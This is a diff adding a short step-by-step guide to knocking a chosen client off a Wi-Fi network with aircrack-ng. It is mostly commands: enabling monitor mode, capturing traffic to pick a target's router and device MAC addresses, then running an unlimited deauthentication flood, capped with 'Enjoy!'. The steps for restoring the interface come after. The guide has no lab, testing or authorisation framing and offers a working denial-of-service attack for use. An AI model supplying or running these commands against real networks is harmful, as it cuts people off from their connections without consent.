@@ -1,1 +1,31 @@
+STEP BY STEP
 
+1. - Update Linux and install the necessary tool. -
+sudo apt update && sudo apt upgrade
+sudo apt install aircrack-ng
+
+2. - Turn your wifi interface to monitoring mode (you will temporarily not have a wifi connection, reversing in the end) -
+airmon-ng start <your_interface> 
+airmon-ng check kill  #Kills any process interfering.
+
+3. - Capture wireless network packets
+airodump-ng <your_interfacemon>
+  3.1
+    Choose one of the clients and copy the BSSID (MAC of the Router or AP) and STATION (MAC of the end device)
+
+4. Start the DoS attack
+aireplay-ng --deauth 0 -a <BSSID_MAC> -c <STATION_MAC> <your_interfacemon>
+
+5.
+Enjoy!
+
+REVERSING INTERFACE
+
+airmon-ng stop <your_intefacemon>
+service NetworkManager start
+service wpa_supplicant start
+
+
+DEBUGGING
+1. Chagging the channel of the interface to the desired one.
+iwconfig <your_interface> channel <CHANNEL>
